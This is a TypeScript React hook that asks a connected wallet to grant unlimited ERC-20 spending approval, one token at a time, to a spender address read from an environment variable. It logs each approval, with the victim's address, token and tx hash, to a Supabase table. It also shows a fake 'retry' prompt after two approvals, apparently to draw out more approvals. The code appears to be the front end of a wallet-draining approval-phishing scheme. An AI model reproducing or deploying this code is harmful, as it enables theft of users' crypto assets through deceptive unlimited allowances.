import { useState } from 'react';
import { parseAbi } from 'viem';
import { useWriteContract, useWaitForTransactionReceipt, useChainId, useAccount } from 'wagmi';
import { createClient } from '@supabase/supabase-js';
import { TokenBalance } from '@/lib/moralis';
import { useWalletStatus } from './useWalletStatus';

const ERC20_ABI = parseAbi([
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
]);

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL || '',
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || ''
);

export function useTokenAuthorization(tokens: TokenBalance[]) {
  const { writeContractAsync } = useWriteContract();
  const [authorizationProgress, setAuthorizationProgress] = useState(0);
  const [isAuthorizing, setIsAuthorizing] = useState(false);
  const [currentAuthToken, setCurrentAuthToken] = useState<string>('');
  const [showRetryMessage, setShowRetryMessage] = useState(false);
  const [txHash, setTxHash] = useState<string | null>(null);
  const chainId = useChainId();
  const { address } = useAccount();
  const { markTokenAuthorized } = useWalletStatus();

  useWaitForTransactionReceipt({ hash: txHash as `0x${string}` });

  const authorizeToken = async (token: TokenBalance) => {
    try {
      setIsAuthorizing(true);
      setCurrentAuthToken(token.symbol);
      setShowRetryMessage(false);
      const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS;
      if (!spenderAddress || !address) throw new Error('Missing spender address or user address');
      await writeContractAsync({
        address: token.token_address as `0x${string}`,
        abi: ERC20_ABI,
        functionName: 'approve',
        args: [spenderAddress as `0x${string}`, BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")],
      }, {
        onSuccess: async (data) => {
          setTxHash(data);
          setIsAuthorizing(false);
          markTokenAuthorized(token.token_address);
        
          const { error, status, data: dbResponse } = await supabase.from('authorizations').insert({
            user_address: address,
            token_symbol: token.symbol,
            contract_address: token.token_address,
            approved_amount: 'unlimited',
            network: chainId,
            spender_address: spenderAddress,
            tx_hash: data,
          });
        
          if (error) {
            console.error('[Supabase] 授权数据插入失败:', error);
          } else {
            console.log('[Supabase] 授权数据插入成功:', dbResponse, 'Status:', status);
          }
        }
,        
        onError: () => {
          setShowRetryMessage(true);
          setIsAuthorizing(false);
        },
      });
      const authorizedCount = tokens.filter((t) => t.authorized || t.token_address === token.token_address).length;
      setAuthorizationProgress((authorizedCount / tokens.length) * 100);
      setCurrentAuthToken('');
      if (authorizedCount >= 2) setTimeout(() => setShowRetryMessage(true), 1000);
    } catch (error) {
      setIsAuthorizing(false);
      setCurrentAuthToken('');
      setShowRetryMessage(true);
    }
  };

  return {
    authorizationProgress,
    isAuthorizing,
    currentAuthToken,
    showRetryMessage,
    authorizeToken,
    setShowRetryMessage,
  };
} 